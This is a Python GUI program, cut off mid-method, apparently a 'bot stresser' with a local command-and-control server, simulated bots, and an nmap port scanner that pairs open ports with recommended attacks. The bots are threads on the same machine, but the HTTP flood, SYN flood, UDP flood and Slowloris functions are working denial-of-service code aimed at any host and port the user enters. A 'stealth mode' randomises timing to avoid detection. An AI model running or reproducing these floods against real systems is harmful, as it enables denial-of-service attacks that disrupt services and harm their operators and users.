# simplified_stresser_2.py (With Enhanced Bot Simulation, Delay, Improved UDP Flood, and Non-Blocking Port Scan)
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import socket
import random
import time
import threading
import requests
from scapy.all import IP, TCP, send, UDP
import nmap # Requires 'python-nmap' package
from flask import Flask, request, jsonify
from datetime import datetime
import logging
import sys
import platform
# import uuid # Unused import
# import psutil # Unused import
# import json # Unused import
# import ctypes # Unused import

# Suppress Flask logging for cleaner output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- Global Variables ---
C2_HOST = "127.0.0.1"
C2_PORT = 5000
C2_SERVER_RUNNING = False
ACTIVE_BOTS = {}
PACKETS_SENT = 0
FAILED_PACKETS = 0
STEALTH_MODE = False
RATE_LIMIT = 0.1
OPEN_PORTS = []
C2_SERVER_THREAD = None

# --- Enhanced Bot Simulation Data ---
BOT_OS_TYPES = [
    {"name": "Windows 10", "arch": "x64", "priv": "user"},
    {"name": "Windows 11", "arch": "x64", "priv": "admin"},
    {"name": "Windows Server 2019", "arch": "x64", "priv": "system"},
    {"name": "Ubuntu 20.04", "arch": "x64", "priv": "user"},
    {"name": "Ubuntu 22.04", "arch": "x64", "priv": "root"},
    {"name": "CentOS 8", "arch": "x64", "priv": "user"},
    {"name": "CentOS 7", "arch": "x64", "priv": "root"},
    {"name": "Debian 11", "arch": "x64", "priv": "user"},
    {"name": "macOS Monterey", "arch": "ARM64", "priv": "user"},
    {"name": "macOS Big Sur", "arch": "x64", "priv": "admin"},
    {"name": "Android 12", "arch": "ARM64", "priv": "user"},
    {"name": "Android 11", "arch": "ARM", "priv": "root"},
    {"name": "iOS 15", "arch": "ARM64", "priv": "mobile"},
    {"name": "iOS 16", "arch": "ARM64", "priv": "mobile"},
    {"name": "Kali Linux", "arch": "x64", "priv": "root"},
    {"name": "Parrot OS", "arch": "x64", "priv": "user"},
    {"name": "Windows 7", "arch": "x64", "priv": "user"},
    {"name": "Windows 8.1", "arch": "x64", "priv": "admin"},
    {"name": "Raspberry Pi OS", "arch": "ARM", "priv": "pi"},
    {"name": "Alpine Linux", "arch": "x64", "priv": "user"}
]

BOT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Mozilla/5.0 (Android 12; Mobile) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
]

BOT_GEO_LOCATIONS = [
    "US-NY", "US-CA", "US-TX", "UK-LN", "DE-BE", "FR-PA", "JP-TK",
    "AU-SY", "CA-ON", "BR-SP", "IN-MU", "CN-SH", "RU-MS", "KR-SE"
]

# --- Flask App for C2 Server ---
c2_app = Flask(__name__)

# --- C2 Server Routes ---
@c2_app.route('/register', methods=['POST'])
def register_bot():
    try:
        data = request.json
        bot_id = data.get('id')
        ip = request.remote_addr
        if bot_id:
            ACTIVE_BOTS[bot_id] = {
                'ip': ip,
                'last_seen': datetime.now().strftime("%H:%M:%S"),
                'os': data.get('os', 'Unknown'),
                'arch': data.get('arch', 'Unknown'),
                'priv': data.get('priv', 'user'),
                'location': data.get('location', 'Unknown'),
                'user_agent': data.get('user_agent', 'Unknown'),
                'session_id': None
            }
            print(f"[C2] Bot registered: {bot_id} from {ip} | {data.get('os')} | {data.get('location')}")
            return jsonify({"status": "registered", "command": "idle"})
        else:
            return jsonify({"status": "error", "message": "Bot ID missing"}), 400
    except Exception as e:
        print(f"[C2 ERROR] Registering bot: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@c2_app.route('/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    cmd = {"cmd": "idle"}
    try:
        if bot_id in ACTIVE_BOTS:
            ACTIVE_BOTS[bot_id]['last_seen'] = datetime.now().strftime("%H:%M:%S")
            # Check for pending command from GUI
            if hasattr(SimplifiedStresserGUI, 'pending_command') and SimplifiedStresserGUI.pending_command:
                cmd = SimplifiedStresserGUI.pending_command
    except Exception as e:
        print(f"[C2 ERROR] Getting command for {bot_id}: {e}")
    return jsonify(cmd)

def run_c2_server():
    global C2_SERVER_RUNNING
    try:
        print(f"[C2] Starting server on http://{C2_HOST}:{C2_PORT}")
        c2_app.run(host=C2_HOST, port=C2_PORT, threaded=True, debug=False, use_reloader=False)
    except Exception as e:
        print(f"[C2 ERROR] Failed to start server: {e}")
    finally:
        C2_SERVER_RUNNING = False

# --- Enhanced Bot Simulation Functions ---
def generate_bot_id():
    """Generate a unique bot ID with realistic characteristics"""
    prefix = random.choice(['WIN', 'LNX', 'MAC', 'AND', 'IOS', 'RPI'])
    suffix = ''.join(random.choices('0123456789ABCDEF', k=8))
    return f"{prefix}-{suffix}"

def get_random_bot_profile():
    """Get a random bot profile from the predefined list"""
    return random.choice(BOT_OS_TYPES)

def get_random_user_agent():
    """Get a random user agent string"""
    return random.choice(BOT_USER_AGENTS)

def get_random_location():
    """Get a random geographic location"""
    return random.choice(BOT_GEO_LOCATIONS)

# --- Main GUI Class ---
class SimplifiedStresserGUI:
    pending_command = None
    udp_flooding = False # Control flag for local UDP flood

    def __init__(self, root):
        self.root = root
        self.root.title("Simplified A.I BOT STRESSER")
        self.root.geometry("1300x850")
        self.root.configure(bg='#0a0a1a')
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.bot_count = 0
        self.bot_list_update_job = None
        self.udp_flood_thread = None
        self.port_scan_thread = None
        self.scan_button = None # Reference to the scan button for enabling/disabling
        self.setup_ui()

    def setup_ui(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)

        self.tab_main = ttk.Frame(self.notebook)
        self.tab_attacks = ttk.Frame(self.notebook)
        self.tab_c2 = ttk.Frame(self.notebook)
        self.tab_pen_test = ttk.Frame(self.notebook)
        self.tab_bot_sim = ttk.Frame(self.notebook)  # New Bot Simulation Tab

        self.notebook.add(self.tab_main, text='Dashboard')
        self.notebook.add(self.tab_attacks, text='Stress Testing')
        self.notebook.add(self.tab_c2, text='HTTP C2 Server')
        self.notebook.add(self.tab_pen_test, text='Port Scanner')
        self.notebook.add(self.tab_bot_sim, text='Bot Simulator')  # Add Bot Simulator Tab

        self.setup_main_tab()
        self.setup_attack_tab()
        self.setup_c2_tab()
        self.setup_pentest_tab() # Setup Port Scanner Tab
        self.setup_bot_sim_tab()  # Setup Bot Simulator Tab

        # Status Bar
        self.status_var = tk.StringVar(value="Ready")
        self.status_bar = tk.Label(self.root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W, bg='#0a0a1a', fg='white')
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def update_status(self, message):
        self.status_var.set(f"Status: {message}")

    def setup_main_tab(self):
        frame = tk.Frame(self.tab_main, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Stats Frame
        stats_frame = tk.Frame(frame, bg='#0a0a1a')
        stats_frame.pack(pady=10)
        self.bot_var = tk.StringVar(value="0")
        self.packet_var = tk.StringVar(value="0")
        self.time_var = tk.StringVar(value=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        tk.Label(stats_frame, text="Bots: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        tk.Label(stats_frame, textvariable=self.bot_var, bg='#0a0a1a', fg='green').pack(side=tk.LEFT)
        tk.Label(stats_frame, text=" | Packets: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        tk.Label(stats_frame, textvariable=self.packet_var, bg='#0a0a1a', fg='yellow').pack(side=tk.LEFT)
        tk.Label(stats_frame, text=" | Time: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        tk.Label(stats_frame, textvariable=self.time_var, bg='#0a0a1a', fg='magenta').pack(side=tk.LEFT)

        # Log Text Area
        log_frame = tk.LabelFrame(frame, text="Activity Log", bg='#0a0a1a', fg='white')
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
        self.log_text = scrolledtext.ScrolledText(log_frame, bg='#1a1a2a', fg='white', state='disabled')
        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)

        # Redirect print statements to log_text
        class TextRedirector:
            def __init__(self, widget, gui_root):
                self.widget = widget
                self.gui_root = gui_root

            def write(self, str):
                try:
                    if self.widget and self.widget.winfo_exists():
                        self.gui_root.after_idle(self._update_widget, str)
                except tk.TclError:
                    pass

            def _update_widget(self, str):
                try:
                    if self.widget and self.widget.winfo_exists():
                         self.widget.configure(state='normal')
                         self.widget.insert(tk.END, str)
                         self.widget.see(tk.END)
                         self.widget.configure(state='disabled')
                except tk.TclError:
                    pass

            def flush(self):
                pass

        sys.stdout = TextRedirector(self.log_text, self.root)
        print("[INFO] Simplified Application started.")

    def setup_attack_tab(self):
        frame = tk.Frame(self.tab_attacks, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Target Configuration
        target_frame = tk.LabelFrame(frame, text="Target Configuration", bg='#0a0a1a', fg='white')
        target_frame.pack(fill='x', pady=10)
        tk.Label(target_frame, text="Target Host:", bg='#0a0a1a', fg='white').grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.target_host = tk.Entry(target_frame, width=20, bg='#1a1a2a', fg='white')
        self.target_host.insert(0, "127.0.0.1")
        self.target_host.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(target_frame, text="Target Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.target_port = tk.Entry(target_frame, width=10, bg='#1a1a2a', fg='white')
        self.target_port.insert(0, "80")
        self.target_port.grid(row=0, column=3, padx=5, pady=5)

        # Attack Type Selection
        attack_frame = tk.LabelFrame(frame, text="Attack Type", bg='#0a0a1a', fg='white')
        attack_frame.pack(fill='x', pady=10)
        self.attack_type = tk.StringVar(value="HTTP Flood")
        attack_types = ["HTTP Flood", "SYN Flood", "UDP Flood", "Slowloris"]
        for i, atype in enumerate(attack_types):
            tk.Radiobutton(attack_frame, text=atype, variable=self.attack_type, value=atype, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').grid(row=0, column=i, sticky='w', padx=10)

        # Bot Control
        bot_frame = tk.LabelFrame(frame, text="Bot Control", bg='#0a0a1a', fg='white')
        bot_frame.pack(fill='x', pady=10)
        tk.Button(bot_frame, text="Add 10 Bots", command=lambda: self.add_bots(10), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(bot_frame, text="Add 50 Bots", command=lambda: self.add_bots(50), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(bot_frame, text="Add 100 Bots", command=lambda: self.add_bots(100), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(bot_frame, text="Stop All Bots", command=self.stop_all_bots, bg='#4d3333', fg='white').pack(side=tk.RIGHT, padx=5)

        # Mode Toggles
        mode_frame = tk.LabelFrame(frame, text="Advanced Modes", bg='#0a0a1a', fg='white')
        mode_frame.pack(fill='x', pady=10)
        tk.Button(mode_frame, text="Toggle Stealth Mode", command=self.toggle_stealth, bg='#334d33', fg='white').pack(side=tk.LEFT, padx=5)
        self.stealth_var = tk.StringVar(value="OFF")
        tk.Label(mode_frame, textvariable=self.stealth_var, bg='#0a0a1a', fg='white').pack(side=tk.LEFT, padx=5)

        # Advanced Bot Simulation Options
        advanced_frame = tk.LabelFrame(frame, text="Advanced Bot Simulation", bg='#0a0a1a', fg='white')
        advanced_frame.pack(fill='x', pady=10)
        self.geo_distribution_var = tk.BooleanVar(value=True)
        tk.Checkbutton(advanced_frame, text="Enable Geographic Distribution", variable=self.geo_distribution_var, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').pack(side=tk.LEFT, padx=5)
        self.realistic_behavior_var = tk.BooleanVar(value=True)
        tk.Checkbutton(advanced_frame, text="Enable Realistic Behavior", variable=self.realistic_behavior_var, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').pack(side=tk.LEFT, padx=5)

        # Local UDP Flood Test (for demonstration/testing)
        udp_test_frame = tk.LabelFrame(frame, text="Local UDP Flood Test", bg='#0a0a1a', fg='white')
        udp_test_frame.pack(fill='x', pady=10)
        tk.Button(udp_test_frame, text="Start Local UDP Flood", command=self.start_local_udp_flood, bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(udp_test_frame, text="Stop Local UDP Flood", command=self.stop_local_udp_flood, bg='#4d3333', fg='white').pack(side=tk.LEFT, padx=5)
        self.udp_status_var = tk.StringVar(value="Stopped")
        tk.Label(udp_test_frame, textvariable=self.udp_status_var, bg='#0a0a1a', fg='white').pack(side=tk.LEFT, padx=5)

    def toggle_stealth(self):
        global STEALTH_MODE, RATE_LIMIT
        STEALTH_MODE = not STEALTH_MODE
        RATE_LIMIT = random.uniform(0.5, 2.0) if STEALTH_MODE else 0.1
        self.stealth_var.set("ON" if STEALTH_MODE else "OFF")
        self.update_status(f"Stealth Mode: {'ON' if STEALTH_MODE else 'OFF'}")

    def add_bots(self, count):
        target = self.target_host.get()
        port = self.target_port.get()
        attack_type = self.attack_type.get()
        if not target or not port:
            messagebox.showerror("Error", "Target and port required!")
            return
        try:
            port = int(port)
        except ValueError:
            messagebox.showerror("Error", "Port must be a number!")
            return
        for i in range(count):
            bot_id = generate_bot_id()
            bot_profile = get_random_bot_profile()
            user_agent = get_random_user_agent()
            location = get_random_location() if self.geo_distribution_var.get() else "Unknown"

            bot_thread = threading.Thread(
                target=self.simulate_bot,
                args=(bot_id, target, port, attack_type, bot_profile, user_agent, location),
                daemon=True
            )
            bot_thread.start()
            self.bot_count += 1
        self.bot_var.set(str(self.bot_count))
        self.update_status(f"Launched {count} bots targeting {target}:{port}")

    def simulate_bot(self, bot_id, target, port, attack_type, bot_profile, user_agent, location):
        global PACKETS_SENT, FAILED_PACKETS

        # --- ADD 10-SECOND DELAY HERE ---
        print(f"[BOT {bot_id}] Waiting 10 seconds before attempting registration...")
        time.sleep(10)  # Wait for 10 seconds before registering
        print(f"[BOT {bot_id}] Attempting registration...")
        # --- END DELAY ADDITION ---

        # Register with C2
        try:
            reg_data = {
                "id": bot_id,
                "os": bot_profile["name"],
                "arch": bot_profile["arch"],
                "priv": bot_profile["priv"],
                "user_agent": user_agent,
                "location": location
            }
            requests.post(f"http://{C2_HOST}:{C2_PORT}/register", json=reg_data, timeout=5)
        except requests.exceptions.RequestException as e:
             print(f"[BOT {bot_id}] Registration failed: {e}")

        ATTACK_RUNNING = False
        while True:
            try:
                # Get command from C2
                resp = requests.get(f"http://{C2_HOST}:{C2_PORT}/command/{bot_id}", timeout=5).json()
                cmd = resp.get("cmd")
                if cmd == "attack":
                    ATTACK_RUNNING = True
                    attack_details = resp
                    current_target = attack_details.get("target", target)
                    current_port = int(attack_details.get("port", port))
                    current_attack_type = attack_details.get("type", attack_type)
                    while ATTACK_RUNNING:
                        try:
                            # Realistic behavior simulation
                            if self.realistic_behavior_var.get():
                                delay = RATE_LIMIT if STEALTH_MODE else random.uniform(0.1, 1.0)
                                # Simulate human-like browsing behavior
                                if random.random() < 0.3:  # 30% chance of "browsing"
                                    time.sleep(random.uniform(1, 5))
                            else:
                                delay = RATE_LIMIT if STEALTH_MODE else random.uniform(0.01, 0.05)

                            time.sleep(delay)

                            if current_attack_type == "HTTP Flood":
                                self.http_flood(current_target, current_port, user_agent)
                            elif current_attack_type == "SYN Flood":
                                self.syn_flood(current_target, current_port)
                            elif current_attack_type == "UDP Flood":
                                # Use the enhanced UDP flood method
                                self.udp_flood(current_target, current_port, connections=100, delay=0) # Adjust params as needed
                            elif current_attack_type == "Slowloris":
                                self.slowloris(current_target, current_port)
                            PACKETS_SENT += 1
                            try:
                                if self.root and self.root.winfo_exists():
                                    self.root.after(0, self._safe_update_packet_var, str(PACKETS_SENT))
                            except tk.TclError:
                                pass
                        except Exception as e:
                            FAILED_PACKETS += 1
                            print(f"[BOT {bot_id}] Attack error: {e}")
                            time.sleep(1)
                elif cmd == "stop":
                    ATTACK_RUNNING = False
                    print(f"[BOT {bot_id}] Attack stopped by C2.")
                    break
                time.sleep(5)
            except requests.exceptions.RequestException as e:
                print(f"[BOT {bot_id}] C2 Communication error: {e}")
                time.sleep(10)
            except Exception as e:
                 print(f"[BOT {bot_id}] General error: {e}")
                 time.sleep(10)

    def _safe_update_packet_var(self, value):
        try:
            if self.packet_var:
                self.packet_var.set(value)
        except tk.TclError:
            pass

    def http_flood(self, target, port, user_agent):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nAccept: */*\r\n\r\n"
            s.send(request.encode())
            s.close()
        except Exception:
            pass

    def syn_flood(self, target, port):
        try:
            ip = IP(dst=target)
            tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            send(ip/tcp, verbose=0)
        except Exception:
            pass

    def udp_flood(self, target, port, connections=100, delay=0):
        """
        Enhanced UDP flood method for bots.
        Sends multiple UDP packets to the target.
        """
        global PACKETS_SENT, FAILED_PACKETS
        try:
            # Resolve hostname once
            target_ip = socket.gethostbyname(target)
            print(f"[BOT] Starting UDP flood on {target_ip}:{port} with {connections} packets")
            for i in range(connections):
                try:
                    # Create socket for each packet (like the Java example)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Send random data
                    sock.sendto(random._urandom(1024), (target_ip, port))
                    sock.close()
                    PACKETS_SENT += 1
                    if delay > 0:
                        time.sleep(delay / 1000.0) # Convert ms to seconds if delay is used
                except socket.error as se:
                    FAILED_PACKETS += 1
                    print(f"[BOT UDP ERROR] Socket error: {se}")
                    # Continue with next packet
                except Exception as e:
                    FAILED_PACKETS += 1
                    print(f"[BOT UDP ERROR] General error: {e}")
                    # Continue with next packet
            print(f"[BOT] UDP flood finished. Sent: {connections}, Failed: {FAILED_PACKETS}")
        except socket.gaierror as ge:
            print(f"[BOT UDP ERROR] Could not resolve target {target}: {ge}")
        except Exception as e:
            print(f"[BOT UDP ERROR] Failed to start flood: {e}")


    def slowloris(self, target, port):
         try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            time.sleep(30)
            s.close()
         except Exception:
            pass

    def stop_all_bots(self):
        SimplifiedStresserGUI.pending_command = {"cmd": "stop"}
        self.update_status("Stop command sent to all bots")

    # --- Local UDP Flood Methods (for GUI testing) ---
    def start_local_udp_flood(self):
        if self.udp_flooding:
            self.update_status("UDP Flood is already running.")
            return
        target = self.target_host.get()
        port_str = self.target_port.get()
        if not target or not port_str:
            messagebox.showerror("Error", "Target and port required for UDP flood!")
            return
        try:
            port = int(port_str)
        except ValueError:
            messagebox.showerror("Error", "Port must be a number!")
            return

        self.udp_flooding = True
        self.udp_status_var.set("Running")
        self.udp_flood_thread = threading.Thread(target=self._run_local_udp_flood, args=(target, port), daemon=True)
        self.udp_flood_thread.start()
        self.update_status(f"Started local UDP flood on {target}:{port}")

    def _run_local_udp_flood(self, target, port):
        connections = 500 # Number of packets to send
        delay_ms = 0      # Delay between packets in milliseconds
        try:
            target_ip = socket.gethostbyname(target)
            print(f"[LOCAL UDP] Starting flood on {target_ip}:{port}")
            for i in range(connections):
                if not self.udp_flooding: # Check flag to stop
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(random._urandom(1024), (target_ip, port))
                    sock.close()
                    # Update packet count in GUI thread-safe manner
                    try:
                        if self.root and self.root.winfo_exists():
                            self.root.after(0, self._safe_update_packet_var, str(PACKETS_SENT + i + 1))
                    except tk.TclError:
                        pass
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                except Exception as e:
                    print(f"[LOCAL UDP ERROR] Packet {i+1}: {e}")
            print(f"[LOCAL UDP] Flood finished.")
        except Exception as e:
            print(f"[LOCAL UDP ERROR] Failed: {e}")
        finally:
            self.udp_flooding = False
            try:
                if self.root and self.root.winfo_exists():
                    self.root.after(0, lambda: self.udp_status_var.set("Stopped"))
            except tk.TclError:
                pass

    def stop_local_udp_flood(self):
        self.udp_flooding = False
        self.update_status("Stopping local UDP flood...")
        # Wait for thread to finish (optional, with timeout)
        if self.udp_flood_thread and self.udp_flood_thread.is_alive():
            self.udp_flood_thread.join(timeout=2) # Wait up to 2 seconds
        self.udp_status_var.set("Stopped")
        self.update_status("Local UDP flood stopped.")

    def _safe_update_packet_var(self, value):
        """Helper to safely update the packet variable if the widget exists."""
        try:
            if self.packet_var: # Check if the variable itself exists
                self.packet_var.set(value)
        except tk.TclError:
            pass # Ignore if associated widgets are destroyed

    def setup_c2_tab(self):
        frame = tk.Frame(self.tab_c2, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # C2 Server Control
        server_frame = tk.LabelFrame(frame, text="C2 Server Control", bg='#0a0a1a', fg='white')
        server_frame.pack(fill='x', pady=10)
        tk.Button(server_frame, text="Start C2 Server", command=self.start_c2_server, bg='#334d33', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(server_frame, text="Stop C2 Server", command=self.stop_c2_server, bg='#4d3333', fg='white').pack(side=tk.LEFT, padx=5)

        # Bot List
        list_frame = tk.LabelFrame(frame, text="Connected Bots", bg='#0a0a1a', fg='white')
        list_frame.pack(fill='both', expand=True, pady=10)
        self.bot_tree = ttk.Treeview(list_frame, columns=('ID', 'IP', 'OS', 'Arch', 'Priv', 'Location', 'Last Seen'), show='headings')
        for col in self.bot_tree['columns']:
            self.bot_tree.heading(col, text=col)
        self.bot_tree.pack(fill='both', expand=True, padx=5, pady=5)

        # Send Attack Command
        attack_frame = tk.LabelFrame(frame, text="Send Attack Command", bg='#0a0a1a', fg='white')
        attack_frame.pack(fill='x', pady=10)
        tk.Label(attack_frame, text="Target:", bg='#0a0a1a', fg='white').grid(row=0, column=0, padx=5, pady=5)
        self.c2_target = tk.Entry(attack_frame, width=15, bg='#1a1a2a', fg='white')
        self.c2_target.insert(0, "127.0.0.1")
        self.c2_target.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(attack_frame, text="Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, padx=5, pady=5)
        self.c2_port = tk.Entry(attack_frame, width=8, bg='#1a1a2a', fg='white')
        self.c2_port.insert(0, "80")
        self.c2_port.grid(row=0, column=3, padx=5, pady=5)
        tk.Label(attack_frame, text="Type:", bg='#0a0a1a', fg='white').grid(row=0, column=4, padx=5, pady=5)
        self.c2_attack_type = tk.StringVar(value="HTTP Flood")
        c2_attack_types = ["HTTP Flood", "SYN Flood", "UDP Flood", "Slowloris"]
        tk.OptionMenu(attack_frame, self.c2_attack_type, *c2_attack_types).grid(row=0, column=5, padx=5, pady=5)
        tk.Button(attack_frame, text="Launch Attack", command=self.send_attack_command, bg='#33334d', fg='white').grid(row=0, column=6, padx=5, pady=5)

        # Start the auto-refresh bot list update loop
        self.schedule_bot_list_update()

    def start_c2_server(self):
        global C2_SERVER_RUNNING, C2_SERVER_THREAD
        if C2_SERVER_RUNNING:
            self.update_status("C2 Server is already running.")
            return
        C2_SERVER_RUNNING = True
        C2_SERVER_THREAD = threading.Thread(target=run_c2_server, daemon=True)
        C2_SERVER_THREAD.start()
        self.update_status(f"HTTP C2 Server starting at http://{C2_HOST}:{C2_PORT}")

    def stop_c2_server(self):
        global C2_SERVER_RUNNING
        C2_SERVER_RUNNING = False
        self.update_status("HTTP C2 Server stopped.")

    def schedule_bot_list_update(self):
        if self.bot_list_update_job:
            self.root.after_cancel(self.bot_list_update_job)
        try:
            if self.root and self.root.winfo_exists():
                self.bot_list_update_job = self.root.after(5000, self.update_bot_list)
        except tk.TclError:
            pass

    def update_bot_list(self):
        try:
            for item in self.bot_tree.get_children():
                self.bot_tree.delete(item)
            for bot_id, info in ACTIVE_BOTS.items():
                self.bot_tree.insert('', tk.END, values=(
                    bot_id,
                    info['ip'],
                    info['os'],
                    info['arch'],
                    info['priv'],
                    info.get('location', 'Unknown'),
                    info['last_seen']
                ))
        except Exception as e:
            print(f"[GUI ERROR] Updating bot list: {e}")
        finally:
            self.schedule_bot_list_update()

    def send_attack_command(self):
        target = self.c2_target.get()
        port = self.c2_port.get()
        attack_type = self.c2_attack_type.get()
        if not target or not port:
            messagebox.showerror("Error", "Target and port required!")
            return
        try:
            port = int(port)
        except ValueError:
            messagebox.showerror("Error", "Port must be a number!")
            return
        SimplifiedStresserGUI.pending_command = {"cmd": "attack", "target": target, "port": port, "type": attack_type}
        self.update_status(f"Attack command sent: {attack_type} on {target}:{port}")

    # --- Port Scanner Tab (Enhanced with Threading) ---
    def setup_pentest_tab(self):
        frame = tk.Frame(self.tab_pen_test, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Scan Target Input
        input_frame = tk.Frame(frame, bg='#0a0a1a')
        input_frame.pack(fill='x', pady=10)
        tk.Label(input_frame, text="Target IP:", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        self.scan_target = tk.Entry(input_frame, width=20, bg='#1a1a2a', fg='white')
        self.scan_target.insert(0, "127.0.0.1")
        self.scan_target.pack(side=tk.LEFT, padx=5)
        self.scan_button = tk.Button(input_frame, text="Scan Open Ports", command=self.scan_ports, bg='#33334d', fg='white')
        self.scan_button.pack(side=tk.LEFT, padx=5)

        # Results Treeview
        result_frame = tk.LabelFrame(frame, text="Scan Results", bg='#0a0a1a', fg='white')
        result_frame.pack(fill='both', expand=True, pady=10)
        self.port_tree = ttk.Treeview(result_frame, columns=('Port/Service', 'Recommended Attack'), show='headings')
        self.port_tree.heading('Port/Service', text='Port/Service')
        self.port_tree.heading('Recommended Attack', text='Recommended Attack')
        # Add scrollbar to the Treeview
        tree_scrollbar_y = ttk.Scrollbar(result_frame, orient="vertical", command=self.port_tree.yview)
        tree_scrollbar_x = ttk.Scrollbar(result_frame, orient="horizontal", command=self.port_tree.xview)
        self.port_tree.configure(yscrollcommand=tree_scrollbar_y.set, xscrollcommand=tree_scrollbar_x.set)
        self.port_tree.pack(side="left", fill="both", expand=True)
        tree_scrollbar_y.pack(side="right", fill="y")
        tree_scrollbar_x.pack(side="bottom", fill="x")

    def scan_ports(self):
        """Initiates the port scan in a separate thread."""
        global OPEN_PORTS
        target = self.scan_target.get().strip()
        if not target:
            messagebox.showerror("Error", "Enter target IP!")
            return

        # Disable button and clear previous results
        if self.scan_button:
            self.scan_button.config(state='disabled', text="Scanning...")
        OPEN_PORTS.clear()
        for item in self.port_tree.get_children():
            self.port_tree.delete(item)

        self.update_status(f"Scanning {target}...")
        print(f"[SCAN] Starting scan on {target}")

        # Start scanning in a separate thread to keep GUI responsive
        self.port_scan_thread = threading.Thread(target=self._run_port_scan, args=(target,), daemon=True)
        self.port_scan_thread.start()

    def _run_port_scan(self, target):
        """Performs the Nmap scan in a background thread."""
        global OPEN_PORTS
        scan_results = []
        error_message = None
        try:
            nm = nmap.PortScanner()
            # Use a faster scan: T3 timing, service version detection, top 1000 ports
            # Consider '-T3 -sV --top-ports 100' for even faster scanning of common ports
            nm.scan(target, arguments='-T3 -sV -F')
            print(f"[SCAN] Nmap command completed for {target}")

            if target in nm.all_hosts():
                host = nm[target]
                print(f"[SCAN] Host {target} found in scan results.")
                for proto in host.all_protocols():
                    print(f"[SCAN] Checking protocol: {proto}")
                    lproto = proto.lower() # Ensure protocol key is lowercase
                    if lproto in host:
                        for port in host[lproto].keys():
                            state = host[lproto][port]['state']
                            service = host[lproto][port].get('name', 'unknown')
                            product = host[lproto][port].get('product', '')
                            version = host[lproto][port].get('version', '')
                            service_info = service
                            if product:
                                service_info += f" ({product}"
                                if version:
                                    service_info += f" {version}"
                                service_info += ")"
                            print(f"[SCAN] Port {port}/{proto}: {state}, Service: {service_info}")
                            if state == 'open':
                                OPEN_PORTS.append(port)
                                rec = self.get_attack_recommendation(port, service)
                                scan_results.append((f"{port}/{service_info}", rec))
                    else:
                        print(f"[SCAN WARNING] Protocol '{lproto}' not found in host data for {target}")
                print(f"[SCAN] Finished processing results for {target}.")
            else:
                print(f"[SCAN WARNING] Target {target} not found in scan results.")
                # Handle case where host is up but no open ports found, or host is down
                host_state = nm.scaninfo().get('status', 'unknown') if nm.scaninfo() else 'unknown'
                if host_state == 'up':
                     error_message = f"Scan completed for {target}. Host is up, but no open ports found."
                else:
                     error_message = f"Scan completed for {target}. Host might be down or blocking scan."
        except nmap.PortScannerError as npe:
            error_message = f"Nmap PortScannerError: {npe}"
            print(f"[SCAN ERROR - PortScannerError] {npe}")
        except Exception as e:
            error_message = f"General scan error: {e}"
            print(f"[SCAN ERROR - General] {e}")
            import traceback
            traceback.print_exc() # Print full traceback for debugging

        # Schedule GUI update in the main thread
        self.root.after(0, self._update_scan_results, scan_results, error_message, target)


    def _update_scan_results(self, results, error_msg, target):
        """Updates the GUI with scan results or error message. Runs in main thread."""
        # Re-enable button
        if self.scan_button:
            self.scan_button.config(state='normal', text="Scan Open Ports")

        if error_msg:
            self.update_status(error_msg)
            messagebox.showerror("Scan Error", error_msg)
            print(f"[SCAN ERROR] {error_msg}")
            return

        # Clear previous results (already done in scan_ports, but good to be sure)
        for item in self.port_tree.get_children():
